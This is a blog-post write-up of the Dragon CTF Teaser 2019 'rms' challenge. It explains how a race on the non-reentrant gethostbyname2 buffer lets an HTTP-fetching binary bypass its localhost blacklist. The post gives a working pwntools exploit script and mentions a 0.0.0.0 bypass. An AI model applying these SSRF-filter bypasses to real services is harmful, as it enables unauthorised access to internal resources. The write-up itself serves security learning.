---
layout: post
title: Dragon CTF Teaser 2019 - rms
description: No re-entry allowed.
comments: true
---

It's been so long since I posted something to this blog!
Let's start again with a nice challenge from this weekend's [Dragon CTF Teaser](https://ctftime.org/event/851).
This web/pwn challenge is named "rms".
It showcases what can happen when you use non-reentrant library functions in a multithreaded application.
A "rms-fixed" version was also released a while later to fix an unintended solution.

> I generally do not connect to web sites from my own machine, aside from a few sites I have some special relationship with. I usually fetch web pages from other sites by sending mail to a program that fetches them, much like wget, and then mails them back to me.
> ~ Richard Stallman
> 
> Flag is at http://127.0.0.1:8000/flag
> 
> IP: rms.hackable.software:1337 (rms-fixed.hackable.software:1337)

Here are the binaries of the two versions: [rms](/assets/ctf/dragonteaser19/rms), [rms-fixed](/assets/ctf/dragonteaser19/rms-fixed).
We will use the fixed one (13 solves, 365 points), as the solution also works on the first one (116 solves, 126 points).
I didn't even realize there was an unintended solution, so my exploit worked out of the box when the fix was released :)

### Overview

The binary is a 64-bit Linux ELF.
When run, it displays the following menu:

```
What do?
        list [p]ending requests
        list [f]inished requests
        [v]iew result of request
        [a]dd new request
        [q]uit
Choice? [pfvaq]
```

The program allows us to make multiple, asynchronous HTTP GET requests.
We can add a new one with the `a` option.
While it is being processed, it will appear in the list of pending requests.
After it is done, it will be moved to the list of finished requests and the response will be available via the `v` option.

The flag is at `http://127.0.0.1:8000/flag`, so let's try the obvious thing:

```
What do?
        list [p]ending requests
        list [f]inished requests
        [v]iew result of request
        [a]dd new request
        [q]uit
Choice? [pfvaq] a
url? http://127.0.0.1:8000/flag

What do?
        list [p]ending requests
        list [f]inished requests
        [v]iew result of request
        [a]dd new request
        [q]uit
Choice? [pfvaq] f
Done:
        [0] FAIL: localhost not allowed
```

Ok, let's reverse it and see how it's blacklisting localhost.

### Auditing

Internally, requests and responses are stored in linked lists with the following node structures:

```c
struct request {
    int id;
    char *url;
    size_t url_len;
    size_t field_18;
    struct request *next;
};

struct response {
    int id;
    char success;
    char *content;
    size_t content_size;
    struct response *next;
};
```

When we add a new request, the function `addp` at 0x1E67 is called (its only parameter is a `struct request **` that points to the list head pointer).
This functions links a new request in the list, asks for the URL, and spawns a thread which will actually perform the request.

The thread entry point is `fetch` at 0x1858, which takes a pointer to the request as its parameter.
After checking that the URL is valid and doesn't point to localhost, `fetch` will call `make_request` at 0x13DC, which actually performs the network I/O.

The first few checks performed by `fetch` are simple enough:

- the URL must start with `http://`
- the host part (before `/`) must be at most 256 characters
- the port (if specified) must be valid

Now we get to the localhost checks, which are done during hostname resolution.
I've tried to reverse them as nicely as possible:

```c
struct sockaddr_storage saddr;
memset(&saddr, 0, sizeof(saddr));

/* IPv6 hostname resolution */
struct hostent *hent6 = gethostbyname2(hostname, AF_INET6);
if (hent6) {
    assert(hent6->h_addrtype == AF_INET6);

    /* Build IPv6 address */
    struct sockaddr_in6 *saddr6 = (struct sockaddr_in6 *) &saddr;
    saddr6->sin6_family = AF_INET6;
    saddr6->sin6_port = port;
    memcpy(&saddr6->sin6_addr, hent6->h_addr_list[0], sizeof(struct in6_addr));

    /* Blacklist loopback and :/8 */
    if (!memcmp(&saddr6->sin6_addr, &in6addr_loopback, sizeof(struct in6_addr)) ||
        saddr6->sin6_addr.s6_addr[0] == 0)
        /* Error: "localhost not allowed" */
}

/* IPv4 hostname resolution */
struct hostent *hent4 = gethostbyname2(hostname, AF_INET);
if (hent4) {
    assert(hent4->h_addrtype == AF_INET);

    /* Blacklist 127.0.0.0/8 and 0.0.0.0/8 */
    if (hent4->h_addr_list[0][0] == 127 || hent4->h_addr_list[0][0] == 0)
        /* Error: "localhost not allowed" */
}
```

The `gethostbyname2` function is a GNU extension that works like `gethostbyname`, but permits to specify the address family to which the address must belong.
There are no immediately apparent bugs here.
By the way, the first version of the challenge didn't check for the zero addresses, so you could solve it by requesting `http://0.0.0.0:8000/flag`.
I didn't notice it, and did it the intended way from the start.
I was very happy when my exploit worked out of the box and first-blooded the new version ;)

After the resolution `saddr` contains the IPv6 address (if available).
As previously said, `fetch` then calls `make_request`:

```c
/* Try IPv6 request (saddr contains IPv6 address from before) */
if (!hent6 || !make_request(&saddr, ...)) {
    /* No IPv6 address, or IPv6 request failed: try IPv4 */
    if (!hent4)
        /* Error */

    /* Build IPv4 address */
    struct sockaddr_in *saddr4 = (struct sockaddr_in *) &saddr;
    saddr4->sin_family = AF_INET;
    saddr4->sin_port = port;
    memcpy(&saddr4->sin_addr, hent4->h_addr_list[0], sizeof(struct in_addr));

    /* Try IPv4 request */
    if (!make_request(&saddr, ...))
        /* Error */
}
```

If you ever worked with multithreaded C code that used the standard library, you might have already seen the bug.
Looking at the [man page](https://linux.die.net/man/3/gethostbyname2) for `gethostbyname2`, one can notice that there is `gethostbyname2_r`, too.
The `_r` suffix in standard functions stands for _reentrant_.
A function is [reentrant](https://www.gnu.org/software/libc/manual/html_node/Nonreentrancy.html) if it can be interrupted and then called again (from another thread or signal handler) before the first call is complete.
This is important in multithreaded software.
When a function exists in two variants, one with the `_r` suffix, it means that the variant without `_r` is not reentrant.

The interesting point is _why_ `gethostbyname2` is not reentrant.
From the man page:

> The functions `gethostbyname()` and `gethostbyaddr()` may return pointers to static data, which may be overwritten by later calls.

This also applies to `gethostbyname2`.
The pointer returned by `gethostbyname2` is a static buffer in libc.
Therefore, if one keeps the pointer and then calls the function again, the pointed address could be overwritten with the new one.
On the other hand, `gethostbyname2_r` accepts a user-allocated buffer to store the address, and is therefore safe from this point of view.

### Exploitation

Because `gethostbyname2` is not reentrant, there is a TOCTTOU vulnerability that we can exploit if we can win the following race:

1. Make a request to `http://evil:8000/flag`, where `evil` is a server that resolves for both IPv4 and IPv6, and makes `make_request` fail for IPv6;
2. While the IPv6 `make_request` is executing, create a new request for `http://127.0.0.1`, which will overwrite the static buffer pointed to by `hent4` with the localhost address;
3. When the IPv6 `make_request` fails, `fetch` will try IPv4 by building the address from `hent4` (which has already been checked, but is now localhost), so `make_request` will fetch `http://127.0.0.1:8000/flag`.

All we need now is a way to make the IPv6 `make_request` fail, and ideally a way to enlarge the race time window.
Fortunately, `make_request` sets a 10 seconds timeout on the HTTP socket:

```c
struct timeval optval;
optval.tv_sec = 10;
optval.tv_usec = 0;
setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &optval, sizeof(optval));
setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &optval, sizeof(optval));
```

When the timeout expires, `make_request` will fail.
This also gives us a 10-seconds window to add the localhost request.
We don't even need a custom server for the timeout: just pick a public firewalled host that ignores packets on port 8000, such as `google.com:8000`.

Response from rms:

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.3 Python/2.7.15+
Date: Sun, 22 Sep 2019 14:43:35 GMT

DrgnS{350aa97f27f497f7bc13}
```

Response from rms-fixed:

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.3 Python/2.7.15+
Date: Sun, 22 Sep 2019 14:50:44 GMT

DrgnS{e9759caf4f2d2b69773c}
```

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *


if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote('rms.hackable.software', 1337)
elif len(sys.argv) > 1 and sys.argv[1] == 'remote-fixed':
    p = remote('rms-fixed.hackable.software', 1337)
else:
    p = process('./rms')


def menu(choice):
    p.recvuntil('Choice? [pfvaq] ')
    p.sendline(choice)

def add(url):
    menu('a')
    p.recvuntil('url? ')
    p.sendline(url)

def view(idx):
    menu('v')
    p.recvuntil('id? ')
    p.sendline(str(idx))
    p.recvuntil('] Response, ')
    size = int(p.recvuntil(' '))
    p.recvline()
    return p.recvn(size)


prog = log.progress('Starting requests')

# block thread A on IPv6 request (google.com:8000 times out)
# we will turn the host into localhost later
add('http://google.com:8000/flag')

# make an IPv4 localhost request on thread B
# will fail, but will poison the static gethostbyname2 buffer
add('http://127.0.0.1')

prog.success()
prog = log.progress('Waiting for completion')

# wait until thread A times out (10s)
# once the IPv6 request times out, it will fall back to IPv4 (poisoned)
sleep(10+1)

prog.success()

# retrieve flag
menu('f') # view doesn't work without listing?
print(view(0))
```
